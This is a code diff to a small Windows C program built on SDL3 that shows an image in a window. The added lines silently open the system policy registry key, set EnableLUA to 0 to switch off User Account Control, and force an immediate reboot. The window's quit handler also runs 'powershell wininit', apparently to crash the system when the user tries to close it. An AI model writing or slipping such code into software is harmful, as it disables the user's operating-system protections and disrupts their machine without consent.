@@ -1,6 +1,7 @@
 #include <SDL3/SDL.h>
 #include <windows.h>
 #include <mmsystem.h>
+#include <stdio.h>
 
 int main()
 {
@@ -8,6 +9,30 @@ int main()
   SDL_Renderer *renderer;
   SDL_Surface *surface;
   SDL_Texture *texture;
+
+  HKEY hKey;
+  LPCSTR subKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
+  DWORD value = 0;
+  DWORD existingValue = 1;
+  DWORD size = sizeof(DWORD);
+
+  if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, subKey, 0, KEY_QUERY_VALUE | KEY_SET_VALUE | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
+
+    RegQueryValueExA(hKey, "EnableLUA", NULL, NULL, (LPBYTE)&existingValue, &size);
+    printf("EnableLUA value: %d\n", existingValue);
+
+    if (existingValue != 0) {
+      if (RegSetValueExA(hKey, "EnableLUA", 0, REG_DWORD, (const BYTE*)&value, sizeof(value)) != ERROR_SUCCESS) {
+        RegCloseKey(hKey);
+      }
+      system("shutdown /r /t 0");
+      // MessageBox(NULL, "There was supposed to be a reboot here", "No reboot today", MB_ICONEXCLAMATION | MB_OK | MB_DEFBUTTON1);
+    }
+  }
+
+  RegCloseKey(hKey);
+
+
 
   if (!SDL_Init(SDL_INIT_VIDEO) || !SDL_Init(SDL_INIT_AUDIO))
   {
@@ -22,10 +47,6 @@ int main()
       SDL_WINDOW_OPENGL,
       &window,
       &renderer);
-
-  // const SDL_AudioSpec srcspec = {SDL_AUDIO_S16, 1, 22050};
-  // const SDL_AudioSpec dstspec = {SDL_AUDIO_F32, 2, 48000};
-  // SDL_AudioStream *stream = SDL_CreateAudioStream(&srcspec, &dstspec);
 
   surface = SDL_LoadBMP("assets/fuck.bmp");
   texture = SDL_CreateTextureFromSurface(renderer, surface);
@@ -46,7 +67,6 @@ int main()
 
     if (event.type == SDL_EVENT_QUIT)
     {
-      SDL_ShowSimpleMessageBox(SDL_MESSAGEBOX_WARNING, "Title", "Message", window);
       system("powershell wininit");
       // break;
     }
